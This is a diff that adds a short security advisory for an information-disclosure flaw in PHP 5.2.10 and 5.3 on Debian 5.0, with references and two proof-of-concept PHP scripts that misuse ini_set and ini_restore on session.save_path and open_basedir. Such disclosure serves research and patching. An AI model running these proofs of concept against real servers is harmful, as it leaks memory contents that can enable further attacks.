@@ -1,0 +1,47 @@
+Credit/Author:
+Maksymilian Arciemowicz from SecurityReason
+
+Vulnerable:
+PHP PHP 5.3 
+PHP PHP 5.2.10 
+Debian Linux 5.0 sparc
+Debian Linux 5.0 s/390
+Debian Linux 5.0 powerpc
+Debian Linux 5.0 mipsel
+Debian Linux 5.0 mips
+Debian Linux 5.0 m68k
+Debian Linux 5.0 ia-64
+Debian Linux 5.0 ia-32
+Debian Linux 5.0 hppa
+Debian Linux 5.0 armel
+Debian Linux 5.0 arm
+Debian Linux 5.0 amd64
+Debian Linux 5.0 alpha
+Debian Linux 5.0
+
+References:
+http://www.securityfocus.com/bid/36009/info
+http://securityreason.com/achievement_securityalert/65
+
+Description:
+PHP is prone to an information-disclosure vulnerability. 
+Attackers can exploit this issue to obtain sensitive information that may lead to further attacks
+
+POC 1:
+<?php
+
+ini_set("session.save_path", "0123456789ABCDEF");
+ini_restore("session.save_path");
+session_start();
+?>
+
+POC 2:
+<?php
+ini_set("open_basedir", "A");
+ini_restore("open_basedir");
+ini_get("open_basedir");
+
+
+include("B");
+
+?>
